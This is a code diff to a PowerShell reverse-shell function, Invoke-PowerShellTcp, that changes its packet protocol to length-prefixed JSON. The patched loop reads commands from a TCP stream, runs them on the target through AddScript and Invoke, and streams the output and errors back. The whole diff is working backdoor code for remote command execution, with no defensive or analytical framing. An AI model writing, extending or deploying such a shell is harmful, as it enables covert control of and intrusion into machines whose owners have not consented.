@@ -30,18 +30,22 @@ function Invoke-PowerShellTcp
         param (
             [Parameter(Position = 0)] $Stream
         )
-        $stream.Read($bytes, 0, 2)
-        $packet_type = $bytes
-        $stream.Read($bytes, 0, 4)
-        $packet_length = $bytes
-        if ([BitConverter]::IsLittleEndian) {
-            [Array]::reverse($packet_length)
+        $i = $stream.Read($bytes, 0, 2)
+        if ($i -eq 0) {
+            $Null
+        } else {
+            $packet_type = $bytes[0..1]
+            $stream.Read($bytes, 0, 4)
+            $packet_length = $bytes[0..3]
+            if ([BitConverter]::IsLittleEndian) {
+                [Array]::reverse($packet_length)
+            }
+            $len = [BitConverter]::ToUInt32([byte[]]$packet_length, 0)
+            $stream.Read($bytes, 0, $len)
+            $body = $bytes[0..($len-1)]
+            $body = [System.Text.Encoding]::UTF8.GetString($body)
+            ConvertFrom-Json -InputObject $body
         }
-        $len = [BitConverter]::ToInt32($packet_length)
-        $stream.Read($bytes, 0, $len)
-        $body = $bytes
-        $body = ([text.encoding]::ASCII).GetBytes($body)
-        $body | ConvertFrom-JSON
     }
 
     function Write-ShellPacket {
@@ -50,8 +54,8 @@ function Invoke-PowerShellTcp
             [Parameter(Position = 1)] $Stream
         )
         $body = ($Packet | ConvertTo-JSON)
-        $body = ([text.encoding]::ASCII).GetBytes($body)
-        $packet_length = [BitConverter]::GetBytes($body.length)
+        $body = ([text.encoding]::UTF8).GetBytes($body)
+        $packet_length = [BitConverter]::GetBytes([Uint32]($body.length))
         if ([BitConverter]::IsLittleEndian) {
             [Array]::reverse($packet_length)
         }
@@ -85,14 +89,14 @@ function Invoke-PowerShellTcp
             [Parameter(Position = 0)] $Streams
         )
         $result = @()
-        $error | % { $result+=(@{ "msg_type" = "STREAM_ERROR"; "data" = $_ }) }
+        $error | % { $result+=(@{ "msg_type" = "STREAM_EXCEPTION"; "data" = ($_|Out-String) }) }
         $error.clear()
-        $Streams.Error | % { $result+=(@{ "msg_type" = "STREAM_ERROR"; "data" = $_.MessageData.Message }) }
-        $Streams.Warning | % { $result+=(@{ "msg_type" = "STREAM_WARNING"; "data" = $_.MessageData.Message }) }
-        $Streams.Verbose | % { $result+=(@{ "msg_type" = "STREAM_VERBOSE"; "data" = $_.MessageData.Message }) }
-        $Streams.Debug | % { $result+=(@{ "msg_type" = "STREAM_DEBUG"; "data" = $_.MessageData.Message }) }
-        $Streams.Progress | % { $result+=(@{ "msg_type" = "STREAM_PROGRESS"; "data" = $_.MessageData.Message }) }
-        $Streams.Information | % { $result+=(@{ "msg_type" = "STREAM_INFORMATION"; "data" = $_.MessageData.Message }) }
+        $Streams.Error.MessageData | % { $result+=(@{ "msg_type" = "STREAM_ERROR"; "data" = $_.Message }) }
+        $Streams.Warning.MessageData | % { $result+=(@{ "msg_type" = "STREAM_WARNING"; "data" = $_.Message }) }
+        $Streams.Verbose.MessageData | % { $result+=(@{ "msg_type" = "STREAM_VERBOSE"; "data" = $_.Message }) }
+        $Streams.Debug.MessageData | % { $result+=(@{ "msg_type" = "STREAM_DEBUG"; "data" = $_.Message }) }
+        $Streams.Progress.MessageData | % { $result+=(@{ "msg_type" = "STREAM_PROGRESS"; "data" = $_.Message }) }
+        $Streams.Information.MessageData | % { $result+=(@{ "msg_type" = "STREAM_INFORMATION"; "data" = $_.Message }) }
         $result
     }
 
@@ -132,13 +136,15 @@ function Invoke-PowerShellTcp
 
     $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
     $data = ""
-    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-    {
-        $data = $EncodedText.GetString($bytes,0, $i)
+    # while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+    while ( $packet = (Read-ShellPacket  $stream) ) {
+        # $data = $EncodedText.GetString($bytes,0, $i)
+        $data = $packet.data
 
         #Execute the command on the target.
+        # $PowerShell.Commands.Clear()
         [void]$PowerShell.AddScript($data)
-        $output = ( $PowerShell.Invoke() )
+        $output = ( $PowerShell.Invoke() | Out-String )
 
         Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = $output } $stream
 
